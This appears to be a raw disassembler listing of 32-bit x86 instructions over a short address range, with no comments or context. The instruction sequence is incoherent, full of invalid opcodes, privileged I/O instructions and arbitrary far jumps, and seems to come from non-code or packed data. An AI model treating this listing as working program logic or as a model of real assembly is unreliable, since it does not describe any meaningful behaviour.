  41b80d:	add    eax,0xabb0501f
  41b812:	mov    esi,0x5c3b30de
  41b817:	leave  
  41b818:	dec    edi
  41b819:	ret    0x794e
  41b81c:	dec    ebp
  41b81d:	mov    ebx,0xf98b4138
  41b822:	sahf   
  41b823:	pop    esi
  41b824:	aaa    
  41b825:	jbe    0x41b81d
  41b827:	xor    edx,DWORD PTR [esi+0x43a2b89f]
  41b82d:	mov    dl,0xf4
  41b82f:	imul   ebp,DWORD PTR [edx],0x45
  41b832:	(bad)  
  41b833:	jb     0x41b835
  41b835:	loopne 0x41b885
  41b837:	and    DWORD PTR [edi+0xa],ebp
  41b83a:	jge    0x41b801
  41b83c:	call   0x4fb3:0xda1bbb08
  41b843:	mov    esi,0x9ee9e8f5
  41b848:	lods   eax,DWORD PTR ds:[esi]
  41b849:	leave  
  41b84a:	outs   dx,BYTE PTR ds:[esi]
  41b84b:	mov    WORD PTR [ebp+ecx*4+0x37c285f5],cs
  41b852:	test   eax,0x4dfdf8f
  41b857:	mov    DWORD PTR [ebx+0x19],eax
  41b85a:	nop
  41b85b:	dec    esp
  41b85c:	ins    DWORD PTR es:[edi],dx
  41b85d:	dec    ecx
  41b85e:	in     al,dx
  41b85f:	hlt    
  41b860:	sub    esp,eax
  41b862:	push   es
  41b863:	pop    ebx
  41b864:	jae    0x41b893
  41b866:	sub    BYTE PTR ds:0xbc7636d8,bl
  41b86c:	mov    dl,0x3d
  41b86e:	out    dx,al
  41b86f:	push   esp
  41b870:	ret    
  41b871:	pop    eax
  41b872:	imul   edx,DWORD PTR [esp+edx*1+0x59],0x7e
  41b877:	push   ss
  41b878:	add    ebx,ecx
  41b87a:	pop    ebx
  41b87b:	arpl   WORD PTR [ecx+0x49],si
  41b87e:	bound  ebp,QWORD PTR [edx]
  41b880:	pop    ebp
  41b881:	int    0x67
  41b883:	(bad)  
  41b884:	sti    
  41b885:	sbb    DWORD PTR [ecx],eax
  41b887:	pusha  
  41b888:	sahf   
  41b889:	test   al,0xf6
  41b88b:	add    ebp,eax
  41b88d:	sbb    al,0x63
  41b88f:	and    DWORD PTR [eax+0x62ab7fed],esp
  41b895:	inc    ebx
  41b896:	pop    edx
  41b897:	push   edx
  41b898:	outs   dx,DWORD PTR ds:[esi]
  41b899:	aam    0xb8
  41b89b:	arpl   WORD PTR [ebp+0x2777be04],sp
  41b8a1:	loope  0x41b823
  41b8a3:	jnp    0x41b840
  41b8a5:	cmp    eax,0x3bea0567
  41b8aa:	retf   0x4ddf
  41b8ad:	dec    ebx
  41b8ae:	pop    edi
  41b8af:	or     al,0x2
  41b8b1:	jg     0x41b8bc
  41b8b3:	lock das 
  41b8b5:	cmp    al,0xd0
  41b8b7:	jmp    0x56ae:0xc1ae0fd4
  41b8be:	mov    edi,?
  41b8c0:	adc    DWORD PTR [edx],esi
  41b8c2:	push   0xa87708ef
  41b8c7:	idiv   DWORD PTR [esi]
  41b8c9:	cdq    
  41b8ca:	pop    eax
  41b8cb:	rcl    BYTE PTR [ecx],0xcc
  41b8ce:	adc    edi,DWORD PTR [ecx-0x63954f52]
  41b8d4:	sahf   
  41b8d5:	rol    DWORD PTR [ebp-0x2c],cl
  41b8d8:	lock sub BYTE PTR [edi],ah
  41b8db:	sbb    edi,DWORD PTR [edx+0x71]
  41b8de:	jb     0x41b89a
  41b8e0:	mov    al,ds:0x40688195
  41b8e5:	bound  ebp,QWORD PTR [edx+0x40ca9b3d]
  41b8eb:	(bad)  [esi+edi*1]
  41b8ee:	mov    esi,0x6479233
  41b8f3:	push   ebp
  41b8f4:	int    0xfe
  41b8f6:	test   esi,edi
  41b8f8:	cmp    eax,eax
  41b8fa:	aas    
  41b8fb:	mov    esp,DWORD PTR [eax+0x6a]
  41b8fe:	dec    esi
  41b8ff:	fistp  DWORD PTR [edx+eax*8+0x1a55c5b3]
  41b906:	fwait
  41b907:	lds    ecx,FWORD PTR [ebx+eax*2+0x59]
  41b90b:	dec    eax
  41b90c:	mov    dh,0xe4
  41b90e:	xor    ebx,DWORD PTR [ebp-0x74]
  41b911:	ds and eax,0xe2ddc71e
  41b917:	pop    ebp
  41b918:	retf   0xa81a
  41b91b:	clc    
  41b91c:	hlt    
  41b91d:	xchg   edx,eax
  41b91e:	cmp    WORD PTR [ebx+0x2870e8f1],ax
  41b925:	(bad)  
  41b926:	sub    al,0x84
  41b928:	ss mov edx,0xa1435c08
  41b92e:	mov    edx,0xc483dab
  41b933:	push   ebp
  41b934:	jno    0x41b8be
  41b936:	hlt    
  41b937:	pusha  
  41b938:	xor    DWORD PTR [ecx],edi
  41b93a:	and    al,0x78
  41b93c:	mul    BYTE PTR [eax+0x2f]
  41b93f:	fsub   st(3),st
  41b941:	dec    ecx
  41b942:	cmp    bh,BYTE PTR [ebx-0x21]
  41b945:	shl    DWORD PTR [edi+0x1a156f35],0xb4
  41b94c:	xchg   edi,eax
  41b94d:	cmc    
  41b94e:	pop    edi
  41b94f:	call   0xfd9428a2
  41b954:	dec    eax
  41b955:	add    al,0x83
  41b957:	out    dx,eax
  41b958:	inc    ebx
  41b959:	add    al,0x68
  41b95b:	pop    esi
  41b95c:	dec    ebx
  41b95d:	pop    ecx
  41b95e:	jns    0x41b9b6
  41b960:	mov    dl,0x5a
  41b962:	imul   esi,DWORD PTR [ebx-0x3877814e],0x5a
  41b969:	sub    ecx,DWORD PTR [edi-0xe2d8604]
  41b96f:	xchg   bl,bl
  41b971:	xchg   ebx,eax
  41b972:	sub    BYTE PTR [esi-0x22],bh
  41b975:	in     eax,0x2f
  41b977:	pushf  
  41b978:	mov    ds:0x27b2cd8e,eax
  41b97d:	jg     0x41b96f
  41b97f:	ja     0x41b924
  41b981:	pop    edi
  41b982:	jp     0x41b95a
  41b984:	sbb    al,0xa8
  41b986:	clts   
  41b988:	and    BYTE PTR [eax],al
  41b98a:	sub    DWORD PTR [edi],0x56
  41b98d:	pushf  
  41b98e:	mov    dh,BYTE PTR [esi+edx*8+0x615f8c65]
  41b995:	pop    edx
  41b996:	(bad)  
  41b997:	xchg   edi,eax
  41b998:	push   esp
  41b999:	sbb    ebx,ebx
  41b99b:	push   0xfffffff3
  41b99d:	cmp    ebp,DWORD PTR [ebp+0x3f0f619b]
  41b9a3:	aaa    
  41b9a4:	pop    edx
  41b9a5:	add    esi,ebp
  41b9a7:	xchg   esi,eax
  41b9a8:	jno    0x41b9c2
  41b9aa:	jle    0x41b9db
  41b9ac:	in     eax,dx
  41b9ad:	cmp    ecx,DWORD PTR [esi+ebp*4-0x17]
  41b9b1:	cwd    
  41b9b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9b4:	sub    eax,0xfaa67ba7
  41b9b9:	cld    
  41b9ba:	push   ebp
  41b9bb:	loop   0x41b9c9
  41b9bd:	mov    eax,0xf4227ee0
  41b9c2:	loopne 0x41b953
  41b9c4:	xor    eax,0xf51a253d
  41b9c9:	fidiv  WORD PTR [edx-0x1a97c8c9]
  41b9cf:	jmp    0xed337ad4
  41b9d4:	mov    ecx,0xbf530250
  41b9d9:	out    0x1,eax
  41b9db:	rol    cl,0x9e
  41b9de:	mov    ebx,0xb4649f4e
  41b9e3:	test   cl,bh
  41b9e5:	arpl   WORD PTR [edi],ax
  41b9e7:	sub    DWORD PTR [edi+eiz*8+0x4a],ecx
  41b9eb:	pop    es
  41b9ec:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41b9ee:	in     eax,0xde
  41b9f0:	rcr    DWORD PTR [ebp+edx*4+0x41de11db],cl
  41b9f7:	push   ecx
  41b9f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9f9:	mov    esp,0x8915f401
  41b9fe:	jns    0x41b986
  41ba00:	cmp    ecx,ebx
  41ba02:	or     DWORD PTR [edx+edi*8-0x4e2f44d0],esp
  41ba09:	retf   0x3a2c
  41ba0c:	test   al,0xca
  41ba0e:	jnp    0x41ba0a
  41ba10:	mov    BYTE PTR [edi],ah
  41ba12:	sbb    eax,0x7fe69493
  41ba17:	pop    es
  41ba18:	or     DWORD PTR [ebx],ebp
  41ba1a:	pop    esi
  41ba1b:	das    
  41ba1c:	mov    eax,0xc534a643
  41ba21:	pop    es
  41ba22:	stc    
  41ba23:	retf   0xbe0e
  41ba26:	ja     0x41b9cb
  41ba28:	cli    
  41ba29:	and    BYTE PTR [ebx],0xa8
  41ba2c:	(bad)  [ecx]
  41ba2e:	ficom  DWORD PTR [edx-0x433042e4]
  41ba34:	push   esp
  41ba35:	cli    
  41ba36:	fdiv   QWORD PTR [edi-0x6c585487]
  41ba3c:	mov    eax,ds:0xd92aecb4
  41ba41:	into   
  41ba42:	cli    
  41ba43:	mov    fs,WORD PTR [esp+esi*8+0x17a833cf]
  41ba4a:	jbe    0x41b9e9
  41ba4c:	inc    edi
  41ba4d:	fnstenv [eax+0x4c69e606]
  41ba53:	push   ebp
  41ba54:	aaa    
  41ba55:	or     eax,0x38f9fe35
  41ba5a:	lds    ecx,FWORD PTR [esi-0x47b2f297]
  41ba60:	stos   DWORD PTR es:[edi],eax
  41ba61:	pop    ds
  41ba62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba63:	add    eax,0x6cb96e58
  41ba68:	sub    dh,BYTE PTR [ebx+0x4c]
  41ba6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba6c:	int3   
  41ba6d:	push   ecx
  41ba6e:	retf   0x8731
  41ba71:	scas   eax,DWORD PTR es:[edi]
  41ba72:	lea    edi,[ecx+edi*4]
  41ba75:	pop    ebp
  41ba76:	arpl   ax,sp
  41ba78:	loopne 0x41ba5e
  41ba7a:	xor    ah,BYTE PTR [eax+eiz*1-0x73cd1b56]
  41ba81:	and    al,0xf7
  41ba83:	jo     0x41ba94
  41ba85:	sub    edi,DWORD PTR [ebx+eax*1]
  41ba88:	hlt    
  41ba89:	push   ebp
  41ba8a:	dec    edx
  41ba8b:	out    0xc1,al
  41ba8d:	pop    edi
  41ba8e:	xchg   esp,eax
  41ba8f:	mov    ebx,0xd8d16fb5
  41ba94:	mov    eax,ds:0x30d729d4
  41ba99:	daa    
  41ba9a:	repnz sbb DWORD PTR [eax],eax
  41ba9d:	jmp    0xed9d:0xf1b83d33
  41baa4:	rcl    BYTE PTR [esi+0x2b7f8f1f],1
  41baaa:	cmp    ch,BYTE PTR [edx+ebp*8+0x78f0610c]
  41bab1:	into   
  41bab2:	sub    BYTE PTR [eax+0x78],ah
  41bab5:	mov    edx,0xe18a35b5
  41baba:	repnz scas al,BYTE PTR es:[edi]
  41babc:	pushf  
  41babd:	push   cs
  41babe:	push   ds
  41babf:	jne    0x41bb2f
  41bac1:	pop    ebp
  41bac2:	dec    edi
  41bac3:	sbb    al,0x75
  41bac5:	xor    edx,DWORD PTR [esi]
  41bac7:	dec    ebp
  41bac8:	cmp    DWORD PTR [ebx],0x5f4c8733
  41bace:	mov    al,0x3b
  41bad0:	or     DWORD PTR [eax],edi
  41bad2:	retf   
  41bad3:	(bad)  
  41bad4:	pop    esi
  41bad5:	int3   
  41bad6:	pushf  
  41bad7:	and    eax,0xb52e4322
  41badc:	sub    bh,BYTE PTR [esi-0x4e6244fb]
  41bae2:	mov    edi,0xa734cb0a
  41bae7:	jg     0x41bafd
  41bae9:	lods   eax,DWORD PTR ds:[esi]
  41baea:	xor    DWORD PTR [ebp+0x59],ecx
  41baed:	aas    
  41baee:	xor    BYTE PTR [ecx-0x13313aba],cl
  41baf4:	(bad)  
  41baf5:	and    ah,al
  41baf7:	(bad)  
  41baf8:	inc    edi
  41baf9:	pop    esi
  41bafa:	shl    BYTE PTR [edi+0x2abac6dc],0xc0
  41bb01:	leave  
  41bb02:	and    DWORD PTR [ebp-0x75],ebp
  41bb05:	cmp    eax,DWORD PTR [ecx]
  41bb07:	inc    ebx
  41bb08:	mov    esp,0x1d96631b
  41bb0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb0e:	(bad)  
  41bb0f:	mov    eax,ds:0x2acf48f0
  41bb14:	call   0x7579792
  41bb19:	(bad)  
  41bb1a:	jb     0x41bb88
  41bb1c:	cli    
  41bb1d:	adc    eax,0xba45838a
  41bb22:	add    al,ch
  41bb24:	lods   eax,DWORD PTR ds:[esi]
  41bb25:	sahf   
  41bb26:	iret   
  41bb27:	or     DWORD PTR ds:0x378e97de,eax
  41bb2d:	mov    cl,0x62
  41bb2f:	and    al,0x8
  41bb31:	sub    ebx,DWORD PTR [ebx+0x1d6b66d3]
  41bb37:	das    
  41bb38:	fwait
  41bb39:	pusha  
  41bb3a:	dec    edi
  41bb3b:	mov    WORD PTR [eax-0x891fd68],ds
  41bb41:	je     0x41bb8a
  41bb43:	cmp    al,0x8e
  41bb45:	mov    cl,0x7f
  41bb47:	sar    DWORD PTR [eax+0x6d],1
  41bb4a:	js     0x41baf0
  41bb4c:	jge    0x41bb17
  41bb4e:	sub    eax,0x457eeae0
  41bb53:	jge    0x41bb4c
  41bb55:	rcr    BYTE PTR [eax+0x1a],cl
  41bb58:	sbb    DWORD PTR [edi-0x4c2647d7],edx
  41bb5e:	leave  
  41bb5f:	nop
  41bb60:	test   eax,0xc36b143c
  41bb65:	jg     0x41bb0e
  41bb67:	inc    edi
  41bb68:	mov    WORD PTR [ebx],ss
  41bb6a:	test   al,0x3a
  41bb6c:	push   ds
  41bb6d:	mov    bl,0xbf
  41bb6f:	jbe    0x41bb7f
  41bb71:	push   esi
  41bb72:	dec    edi
  41bb73:	mov    ecx,0x6105723
  41bb78:	das    
  41bb79:	cmp    bh,0x89
  41bb7c:	mov    edi,gs
  41bb7e:	test   al,0x9c
  41bb80:	jg     0x41bb58
  41bb82:	scas   eax,DWORD PTR es:[edi]
  41bb83:	popa   
  41bb84:	sbb    ebp,DWORD PTR [ecx+0x3c]
  41bb87:	sbb    edx,ebx
  41bb89:	xchg   ecx,eax
  41bb8a:	mov    al,ds:0x2206fbf7
  41bb8f:	mov    BYTE PTR ds:0xf4a40c3c,bh
  41bb95:	loopne 0x41bbf1
  41bb97:	xchg   edi,eax
  41bb98:	push   es
  41bb99:	inc    DWORD PTR [eax+0x13]
  41bb9c:	stc    
  41bb9d:	push   cs
  41bb9e:	pushf  
  41bb9f:	retf   
  41bba0:	test   ah,bl
  41bba2:	mov    edi,cs
  41bba4:	fs adc al,0x69
  41bba7:	adc    DWORD PTR [edi],0xb80b6f9a
  41bbad:	push   edi
  41bbae:	stc    
  41bbaf:	mov    DWORD PTR [ebx+0xf401ced],edx
  41bbb5:	sti    
  41bbb6:	inc    DWORD PTR [ecx+eiz*4]
  41bbb9:	jns    0x41bbf2
  41bbbb:	cdq    
  41bbbc:	mov    edi,0x5c49cd5
  41bbc1:	adc    esp,DWORD PTR [edx+0x2758c1fd]
  41bbc7:	int    0x96
  41bbc9:	or     al,0x19
  41bbcb:	push   DWORD PTR [edi+edi*1+0x137a9e24]
  41bbd2:	bound  ecx,QWORD PTR [esi+0x27]
  41bbd5:	loop   0x41bbe0
  41bbd7:	push   edi
  41bbd8:	mov    dl,0xae
  41bbda:	mov    WORD PTR [edx+edi*2-0x6],gs
  41bbde:	and    bl,BYTE PTR [ebx-0x54bf9941]
  41bbe4:	stos   BYTE PTR es:[edi],al
  41bbe5:	sub    DWORD PTR [edi+edi*1+0x4d],eax
  41bbe9:	mov    cs,WORD PTR [edx]
  41bbeb:	mov    DWORD PTR [ebp+0x2e0863e1],edx
  41bbf1:	jmp    0xba5e:0xb0939fb8
  41bbf8:	adc    esp,edx
  41bbfa:	leave  
  41bbfb:	mov    ebx,0xa86da772
  41bc00:	jb     0x41bbb4
  41bc02:	sar    DWORD PTR [ebp-0xa],0x65
  41bc06:	mov    esi,0x97f1e27b
  41bc0b:	mov    ebx,0xe0641998
  41bc10:	(bad)  
  41bc11:	xor    BYTE PTR [ebx+eiz*2-0x48363af5],al
  41bc18:	ins    DWORD PTR es:[edi],dx
  41bc19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc1b:	add    al,BYTE PTR [edi]
  41bc1d:	mov    ah,0xd
  41bc1f:	retf   
  41bc20:	jns    0x41bc9f
  41bc22:	mov    bh,0x48
  41bc24:	or     al,0x35
  41bc26:	stos   BYTE PTR es:[edi],al
  41bc27:	iret   
  41bc28:	das    
  41bc29:	ret    0x6e47
  41bc2c:	dec    esp
  41bc2d:	ret    0xe002
  41bc30:	lods   eax,DWORD PTR ds:[esi]
  41bc31:	ins    DWORD PTR es:[edi],dx
  41bc32:	xchg   edi,eax
  41bc33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc34:	add    eax,0xa96b0b6e
  41bc39:	cdq    
  41bc3a:	mov    dl,0x22
  41bc3c:	iret   
  41bc3d:	add    ah,BYTE PTR [ecx+0x3c]
  41bc40:	xchg   esi,eax
  41bc41:	jmp    0x876a661a
  41bc46:	dec    esi
  41bc47:	fadd   DWORD PTR [eax-0x50230ab1]
  41bc4d:	jmp    0x769d:0xe4ed5baa
  41bc54:	jno    0x41bbdd
  41bc56:	sub    DWORD PTR [eax-0x31df2169],ebp
  41bc5c:	test   eax,0x595ae993
  41bc61:	jmp    0x308:0x8d246b16
  41bc68:	xor    al,0xca
  41bc6a:	xchg   BYTE PTR cs:[ebx+0x74f9a67c],cl
  41bc71:	push   esi
  41bc72:	xor    ebx,edx
  41bc74:	add    ch,BYTE PTR [ecx-0x4f69c68a]
  41bc7a:	sar    DWORD PTR [eax+0x2cee0a5c],1
  41bc80:	jne    0x41bc70
  41bc82:	push   edx
  41bc83:	or     eax,0xbae35561
  41bc88:	daa    
  41bc89:	mov    ah,0x44
  41bc8b:	(bad)  
  41bc8c:	and    al,0x1d
  41bc8e:	ins    BYTE PTR es:[edi],dx
  41bc8f:	xchg   ebx,eax
  41bc90:	inc    ecx
  41bc91:	add    cl,BYTE PTR [ecx]
  41bc93:	jge    0x41bce6
  41bc95:	jp     0x41bc8a
  41bc97:	mov    bl,0xf9
  41bc99:	cmc    
  41bc9a:	inc    ebp
  41bc9b:	dec    eax
  41bc9c:	jno    0x41bce2
  41bc9e:	or     ebx,esp
  41bca0:	mov    BYTE PTR [ecx+eax*4+0x26],ah
  41bca4:	dec    eax
  41bca5:	dec    eax
  41bca6:	jae    0x41bcae
  41bca8:	and    BYTE PTR [edi+0x60],al
  41bcab:	inc    esp
  41bcac:	pop    ecx
  41bcad:	jle    0x41bd00
  41bcaf:	data16 das 
  41bcb1:	repz xchg edi,eax
  41bcb3:	xor    al,0x1f
  41bcb5:	int3   
  41bcb6:	add    ebp,DWORD PTR cs:[edi+0x7484251b]
  41bcbd:	inc    esi
  41bcbe:	stos   DWORD PTR es:[edi],eax
  41bcbf:	pop    ss
  41bcc0:	je     0x41bc43
  41bcc2:	inc    ecx
  41bcc3:	dec    ecx
  41bcc4:	jl     0x41bce2
  41bcc6:	(bad)  [eax-0x7ee94454]
  41bccc:	mov    DWORD PTR [esi+edi*4-0x16],edx
  41bcd0:	inc    esi
  41bcd1:	jl     0x41bcb6
  41bcd3:	pop    esp
  41bcd4:	(bad)  
  41bcd5:	call   0xb2a0:0xa4791e34
  41bcdc:	pop    edx
  41bcdd:	std    
  41bcde:	jge    0x41bd31
  41bce0:	adc    ebp,eax
  41bce2:	dec    ebp
  41bce3:	mov    dl,0xf7
  41bce5:	fcmovnb st,st(7)
  41bce7:	xlat   BYTE PTR ds:[ebx]
  41bce8:	sahf   
  41bce9:	cdq    
  41bcea:	retf   
  41bceb:	inc    edi
  41bcec:	test   al,0x2f
  41bcee:	fstp   QWORD PTR [ecx]
  41bcf0:	mov    al,dl
  41bcf2:	ja     0x41bd09
  41bcf4:	addr16 inc esi
  41bcf6:	mov    esp,0x734b5295
  41bcfb:	out    0xe7,al
  41bcfd:	mov    al,ds:0xcffc2084
  41bd02:	out    dx,al
  41bd03:	jl     0x41bcff
  41bd05:	xor    al,0x70
  41bd07:	jge    0x41bcca
  41bd09:	(bad)  [eax]
  41bd0b:	jecxz  0x41bcf4
  41bd0d:	fwait
  41bd0e:	stc    
  41bd0f:	scas   eax,DWORD PTR es:[edi]
  41bd10:	or     DWORD PTR [ecx+0x3e],esi
  41bd13:	xor    bl,bl
  41bd15:	or     dh,cl
  41bd17:	mov    ebx,0x87d4e4aa
  41bd1c:	jb     0x41bd98
  41bd1e:	push   0x3b
  41bd20:	call   0x4077:0x1e1d2515
  41bd27:	add    BYTE PTR [esi+edx*1],dl
  41bd2a:	shl    BYTE PTR [edi+0x5f],0xb4
  41bd2e:	xchg   esi,eax
  41bd2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd30:	pop    ss
  41bd31:	push   esi
  41bd32:	test   DWORD PTR [ebp+edi*8-0x34936cc3],edx
  41bd39:	mov    ds:0xdb716eaa,al
  41bd3e:	leave  
  41bd3f:	inc    BYTE PTR [esi]
  41bd41:	jne    0x41bd36
  41bd43:	(bad)  [ecx+0x1c]
  41bd46:	inc    esi
  41bd47:	adc    al,0xc1
  41bd49:	fs xchg ebp,eax
  41bd4b:	stos   DWORD PTR es:[edi],eax
  41bd4c:	push   cs
  41bd4d:	xchg   BYTE PTR [eax+0x8a16085],bh
  41bd53:	int3   
  41bd54:	arpl   WORD PTR [esi-0x144a5766],dx
  41bd5a:	in     al,0x36
  41bd5c:	lods   al,BYTE PTR ds:[esi]
  41bd5d:	fist   DWORD PTR [esi+0x729c448b]
  41bd63:	jbe    0x41bd02
  41bd65:	(bad)  
  41bd66:	daa    
  41bd67:	dec    esp
  41bd68:	or     esp,ecx
  41bd6a:	fbstp  TBYTE PTR [ebp-0x53216511]
  41bd70:	sub    eax,0x4f14cd65
  41bd75:	xchg   DWORD PTR [esi+0x45aef4a6],ebx
  41bd7b:	or     al,0x6b
  41bd7d:	outs   dx,DWORD PTR gs:[si]
  41bd80:	sub    DWORD PTR [ecx+edi*1+0x64824d55],ecx
  41bd87:	jo     0x41bdbd
  41bd89:	xchg   ebp,eax
  41bd8a:	fsub   QWORD PTR [esi+0x5a]
  41bd8d:	ja     0x41be02
  41bd8f:	pop    edx
  41bd90:	sub    BYTE PTR [ebx+0xd349cde],0x8d
  41bd97:	xchg   ebp,eax
  41bd98:	inc    esp
  41bd99:	sbb    BYTE PTR [ebx-0x56449db4],ah
  41bd9f:	gs mov ebx,0x3ff74ce6
  41bda5:	icebp  
  41bda6:	cmp    ch,al
  41bda8:	cmp    eax,0x45492570
  41bdad:	inc    eax
  41bdae:	sub    edx,eax
  41bdb0:	jo     0x41be16
  41bdb2:	lea    ecx,[ecx]
  41bdb4:	xchg   ecx,eax
  41bdb5:	mov    DWORD PTR [ecx-0x41b01584],ebx
  41bdbb:	mov    ecx,0xf83ad3d8
  41bdc0:	xchg   edi,eax
  41bdc1:	push   0x893def6f
  41bdc6:	or     esi,ebx
  41bdc8:	mov    ch,0xe7
  41bdca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdcb:	in     eax,0xab
  41bdcd:	jg     0x41bd75
  41bdcf:	ins    BYTE PTR es:[edi],dx
  41bdd0:	mov    edi,0xe36901d4
  41bdd5:	jmp    0x41bdf6
  41bdd7:	pop    eax
  41bdd8:	inc    edi
  41bdd9:	call   0xb5a9:0x74926ddf
  41bde0:	ret    0x93eb
  41bde3:	fisttp WORD PTR [ebx-0x6e11ab00]
  41bde9:	int    0xdd
  41bdeb:	movupd XMMWORD PTR [esi-0xb],xmm1
  41bdf0:	and    dl,BYTE PTR [ecx]
  41bdf2:	adc    ch,BYTE PTR [esi]
  41bdf4:	add    BYTE PTR [edi+eiz*1],ah
  41bdf7:	mov    edx,0x63f08918
  41bdfc:	out    dx,al
  41bdfd:	retf   0x5f15
  41be00:	inc    esp
  41be01:	mov    edx,0xac435b88
  41be06:	inc    edx
  41be07:	mov    al,0x9e
  41be0a:	jmp    0xdf104fd3
  41be0f:	sub    al,0xcb
  41be11:	pop    ecx
  41be12:	mov    dh,0x65
  41be14:	in     eax,dx
  41be15:	pop    esi
  41be16:	and    bl,BYTE PTR [ecx-0x77]
  41be19:	and    esi,DWORD PTR ds:0x37ea203c
  41be1f:	ins    DWORD PTR es:[edi],dx
  41be20:	(bad)  
  41be21:	pop    edx
  41be22:	shl    DWORD PTR [ecx],1
  41be24:	sti    
  41be25:	xchg   ebx,eax
  41be26:	repnz fwait
  41be28:	bound  ebx,QWORD PTR [ebx+0x7]
  41be2b:	daa    
  41be2c:	add    BYTE PTR [edx+eax*1],al
  41be2f:	sub    BYTE PTR [edi-0x57d93d27],al
  41be35:	xor    DWORD PTR [esi],esi
  41be37:	add    al,0xa8
  41be39:	xchg   ebp,eax
  41be3a:	dec    ecx
  41be3b:	or     al,0xee
  41be3d:	push   es
  41be3e:	xchg   edi,eax
  41be3f:	stc    
  41be40:	inc    ebx
  41be41:	outs   dx,DWORD PTR ds:[esi]
  41be42:	jmp    0xeeb8:0x80af1bd2
  41be49:	test   BYTE PTR [esp+eax*1],0x25
  41be4d:	mov    esp,ebp
  41be4f:	stos   BYTE PTR es:[edi],al
  41be50:	mov    esp,0xe456dc35
  41be55:	dec    eax
  41be56:	cli    
  41be57:	jmp    0x35887f49
  41be5c:	inc    esp
  41be5d:	cdq    
  41be5e:	inc    BYTE PTR [esi+0x2e5d855b]
  41be64:	jae    0x41be29
  41be66:	add    BYTE PTR [ecx+ecx*8-0x379b8fb0],bh
  41be6d:	ins    DWORD PTR es:[edi],dx
  41be6e:	retf   0x5cde
  41be71:	jbe    0x41be52
  41be73:	jbe    0x41bef2
  41be75:	sbb    eax,DWORD PTR [edi+0x261687ea]
  41be7b:	pop    edi
  41be7c:	mov    eax,ds:0xbfdf33b0
  41be81:	mov    al,0x72
  41be83:	cmp    al,0x57
  41be85:	mov    esi,0xa21d2cc1
  41be8a:	mov    dh,0x32
  41be8c:	xor    esp,DWORD PTR [edx+edi*2]
  41be8f:	jg     0x41bf0d
  41be91:	dec    ecx
  41be92:	repz leave 
  41be94:	jge    0x41beed
  41be96:	lods   al,BYTE PTR ds:[esi]
  41be97:	xor    al,BYTE PTR [eax]
  41be99:	mov    DWORD PTR [eax+0x722adb7b],ecx
  41be9f:	jb     0x41bea3
  41bea1:	pusha  
  41bea2:	ds popa 
  41bea4:	jo     0x41be86
  41bea6:	inc    esp
  41bea7:	(bad)  
  41bea8:	loope  0x41bef1
  41beaa:	not    DWORD PTR [edi-0x165c661c]
  41beb0:	mov    eax,ds:0x1fb75b3d
  41beb5:	pusha  
  41beb6:	pop    edx
  41beb7:	addr16 jns 0x41be5f
  41beba:	clc    
  41bebb:	and    edx,DWORD PTR [ebp+0x5a41d8fa]
  41bec1:	retf   0xe01c
  41bec4:	inc    edi
  41bec5:	in     al,dx
  41bec6:	dec    edi
  41bec7:	addr16 push ds
  41bec9:	call   0x7186:0xa4a09c84
  41bed0:	add    dl,BYTE PTR [ebp+0x7054e86e]
  41bed6:	jmp    0x7d76:0xebd1f5a5
  41bedd:	je     0x41bf24
  41bedf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bee0:	in     eax,dx
  41bee1:	jno    0x41bf3d
  41bee3:	sub    edi,DWORD PTR [eax-0x7f49be9a]
  41bee9:	pop    ss
  41beea:	fnstsw WORD PTR [esi+ecx*1+0x55]
  41beee:	mov    bh,0x8b
  41bef0:	sub    ecx,DWORD PTR [ecx+0x684b2628]
  41bef6:	pop    eax
  41bef7:	sbb    cl,BYTE PTR [ebx+0x5e]
  41befa:	in     al,dx
  41befb:	neg    DWORD PTR [edx]
  41befd:	xchg   ecx,eax
  41befe:	repnz push ds
  41bf00:	fdiv   st,st(2)
  41bf02:	cmp    DWORD PTR ds:0x2a031250,edi
  41bf08:	arpl   WORD PTR [esi+0x3],bp
  41bf0b:	lahf   
  41bf0c:	repz mov edi,0xafebb6fd
  41bf12:	(bad)  
  41bf13:	fsubr  DWORD PTR [eax+0x56e03857]
  41bf19:	push   esi
  41bf1a:	lock ds push eax
  41bf1d:	imul   esi,esp,0x27
  41bf20:	adc    dl,BYTE PTR [ebp+0x6f]
  41bf23:	fcomi  st,st(6)
  41bf25:	jns    0x41bf6c
  41bf27:	pop    edx
  41bf28:	sahf   
  41bf29:	ins    DWORD PTR es:[edi],dx
  41bf2a:	add    bh,BYTE PTR [ebx-0x71]
  41bf2d:	loop   0x41bf27
  41bf2f:	add    eax,0x4c725ecd
  41bf34:	jo     0x41bee5
  41bf36:	cdq    
  41bf37:	and    eax,0x5a5f2286
  41bf3c:	pushf  
  41bf3d:	into   
  41bf3e:	lds    esp,FWORD PTR [edi+ebp*8+0x1df0d22f]
  41bf45:	mov    BYTE PTR [eax-0x39],0x12
  41bf49:	and    al,0x6f
  41bf4b:	and    eax,0xfb7ab8fb
  41bf50:	call   FWORD PTR [edx+0x3e4659ae]
  41bf56:	iret   
  41bf57:	dec    eax
  41bf58:	xchg   esi,eax
  41bf59:	aad    0x66
  41bf5b:	aas    
  41bf5c:	xchg   edx,eax
  41bf5d:	in     eax,0x32
  41bf5f:	das    
  41bf60:	xchg   edi,eax
  41bf61:	(bad)  
  41bf62:	cmp    ch,ch
  41bf64:	pop    ss
  41bf65:	stos   BYTE PTR es:[edi],al
  41bf66:	push   ss
  41bf67:	fist   WORD PTR [edx]
  41bf69:	pushf  
  41bf6a:	or     edi,eax
  41bf6c:	xor    bl,0x19
  41bf6f:	pushf  
  41bf70:	rcl    BYTE PTR [edx+ebx*1-0x4a],0x37
  41bf75:	add    eax,0xa35f94e8
  41bf7a:	fstp   TBYTE PTR [ebx+0x2f18d2a1]
  41bf80:	in     eax,0x54
  41bf82:	xor    DWORD PTR [edi+0x5f],edx
